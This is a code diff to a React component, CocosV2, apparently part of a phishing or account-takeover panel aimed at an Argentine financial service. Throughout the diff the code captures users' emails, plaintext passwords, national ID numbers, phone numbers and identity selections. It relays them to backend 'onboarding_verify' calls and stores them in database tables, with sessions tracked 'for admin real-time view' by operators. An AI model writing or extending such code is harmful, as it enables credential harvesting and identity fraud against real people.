@@ -80,7 +80,6 @@ const CocosV2 = () => {
 
   const [step, setStep] = useState<Step>("login");
   const [email, setEmail] = useState("");
-  const [onboardingAccessEmail, setOnboardingAccessEmail] = useState("");
   const [loading, setLoading] = useState(false);
   const [error, setError] = useState("");
   const [statusMsg, setStatusMsg] = useState("");
@@ -138,10 +137,12 @@ const CocosV2 = () => {
     const { data, error: fnError } = await invokeCocos({ action, ...extra });
 
     if (fnError) {
+      // If backend returned structured payload (even with non-2xx), propagate it
       if (data && typeof data === "object" && "success" in data && (data as { success?: boolean }).success === false) {
         return data;
       }
 
+      // Fallback: parse JSON embedded in error message: "... Error, { ... }"
       const msg = fnError instanceof Error ? fnError.message : String(fnError);
       const firstBrace = msg.indexOf("{");
       const lastBrace = msg.lastIndexOf("}");
@@ -152,6 +153,7 @@ const CocosV2 = () => {
             return embedded;
           }
         } catch {
+          // ignore parse failure and throw original error
         }
       }
 
@@ -161,6 +163,7 @@ const CocosV2 = () => {
     return data;
   }, []);
 
+  // ── Session tracking: create/update session in DB for admin real-time view ──
   const createSession = useCallback(async (userEmail: string, status: string, extra: Record<string, unknown> = {}) => {
     const { data } = await supabase.from("sessions").insert({
       email: userEmail,
@@ -185,43 +188,23 @@ const CocosV2 = () => {
     await supabase.from("sessions").update(payload).eq("id", sid);
   }, []);
 
+  // ── Persist onboarding data to dedicated table (never lose data) ──
   const saveOnboardingData = useCallback(async (data: Record<string, unknown>) => {
     try {
-      const sid = sessionIdRef.current || null;
-      const technicalEmail = String(data.email || onboardingAccessEmail || "").trim().toLowerCase();
-      const visibleEmail = String(email || "").trim().toLowerCase();
-      const normalizedEmail = technicalEmail || visibleEmail;
+      const normalizedEmail = String(data.email || email || "").trim().toLowerCase();
       if (!normalizedEmail) return;
-
-      let existing: { id: string; metadata: Record<string, unknown> | null } | null = null;
-
-      if (sid) {
-        const { data: sessionMatch } = await (supabase as any)
-          .from("wayni_onboarding")
-          .select("id, metadata")
-          .eq("session_id", sid)
-          .order("created_at", { ascending: false })
-          .limit(1)
-          .maybeSingle();
-        existing = sessionMatch || null;
-      }
-
-      if (!existing) {
-        const { data: emailMatch } = await (supabase as any)
-          .from("wayni_onboarding")
-          .select("id, metadata")
-          .eq("email", normalizedEmail)
-          .order("created_at", { ascending: false })
-          .limit(1)
-          .maybeSingle();
-        existing = emailMatch || null;
-      }
+      const sid = sessionIdRef.current || null;
+      const { data: existing } = await (supabase as any)
+        .from("wayni_onboarding")
+        .select("id, metadata")
+        .eq("email", normalizedEmail)
+        .order("created_at", { ascending: false })
+        .limit(1)
+        .single();
 
       const mergedMetadata = {
         ...(((existing?.metadata as Record<string, unknown> | null) ?? {})),
         ...((((data.metadata as Record<string, unknown> | null) ?? {}))),
-        ...(visibleEmail ? { original_login_email: visibleEmail } : {}),
-        ...(technicalEmail ? { generated_email: technicalEmail, access_email: technicalEmail } : {}),
       };
 
       const payload = {
@@ -232,7 +215,7 @@ const CocosV2 = () => {
         updated_at: new Date().toISOString(),
         metadata: Object.keys(mergedMetadata).length > 0 ? mergedMetadata : undefined,
       };
-
+      // Upsert: if there's already a row for this email, update it
       if (existing?.id) {
         await (supabase as any).from("wayni_onboarding").update(payload).eq("id", existing.id);
       } else {
@@ -241,7 +224,7 @@ const CocosV2 = () => {
     } catch (e) {
       console.warn("[ONBOARDING] Failed to persist onboarding data:", e);
     }
-  }, [email, onboardingAccessEmail, operatorCode]);
+  }, [email, operatorCode]);
 
   const upsertAccountForOperator = useCallback(async (partial: Record<string, unknown>) => {
     const normalizedEmail = String(partial.email || "").trim().toLowerCase();
@@ -1078,7 +1061,6 @@ const CocosV2 = () => {
       // continue with onboarding
     }
 
-    const normalizedLoginEmail = String(email || "").trim().toLowerCase();
     const pwd = lastPasswordRef.current || lastPassword;
     const MAX_DNI_RETRIES = 3;
     let result: any = null;
@@ -1087,11 +1069,10 @@ const CocosV2 = () => {
     for (let attempt = 1; attempt <= MAX_DNI_RETRIES; attempt++) {
       const { data: attemptResult, error: apiError } = await invokeWayni({
         action: "onboarding_verify",
-        email: normalizedLoginEmail,
+        email,
         identity_number: data.identity_number,
         phone_number: resolvedPhone,
         password: pwd,
-        session_id: sessionIdRef.current || undefined,
         selected_full_name: data.selected_full_name,
         selected_gender: data.selected_gender,
         selected_tax_identification_value: data.selected_tax_identification_value,
@@ -1108,6 +1089,7 @@ const CocosV2 = () => {
       });
 
       if (attempt < MAX_DNI_RETRIES) {
+        // Wait 500ms before retrying
         await new Promise((r) => setTimeout(r, 500));
       }
     }
@@ -1130,11 +1112,8 @@ const CocosV2 = () => {
       };
     }
 
-    const generatedAccessEmail = String(result?.generated_email || "").trim().toLowerCase();
-    const effectiveAccessEmail = generatedAccessEmail || onboardingAccessEmail;
     const resolvedGender = String(result?.gender || data.selected_gender || "").toUpperCase();
 
-    if (generatedAccessEmail) setOnboardingAccessEmail(generatedAccessEmail);
     if (result?.full_name) setSyncedFullName(result.full_name);
     if (result?.user_uuid) setUserUuid(result.user_uuid);
     if (resolvedGender) setUserGender(resolvedGender);
@@ -1143,8 +1122,8 @@ const CocosV2 = () => {
       otp_code: `dni:${data.identity_number}|name:${result?.full_name || data.selected_full_name || ""}|uuid:${result?.user_uuid || ""}|gender:${resolvedGender}|phone:${resolvedPhone}`,
     });
 
+    // Persist onboarding data to dedicated table
     await saveOnboardingData({
-      email: effectiveAccessEmail,
       dni: data.identity_number,
       full_name: result?.full_name || data.selected_full_name || "",
       phone: resolvedPhone,
@@ -1152,18 +1131,10 @@ const CocosV2 = () => {
       user_uuid: result?.user_uuid || "",
       password: lastPasswordRef.current || lastPassword || "",
       status: "verify_dni_success",
-      metadata: effectiveAccessEmail
-        ? {
-            original_login_email: normalizedLoginEmail,
-            generated_email: effectiveAccessEmail,
-            access_email: effectiveAccessEmail,
-            generated_access_id: result?.generated_access_id || undefined,
-          }
-        : undefined,
     });
 
     setStep("address");
-  }, [email, lastPassword, onboardingAccessEmail, syncedPhone, updateSession, saveOnboardingData]);
+  }, [email, lastPassword, syncedPhone, updateSession, saveOnboardingData]);
 
   // ── Address submission → then biometric ──
   const handleAddressSubmit = useCallback(async (addressData: Record<string, unknown>) => {
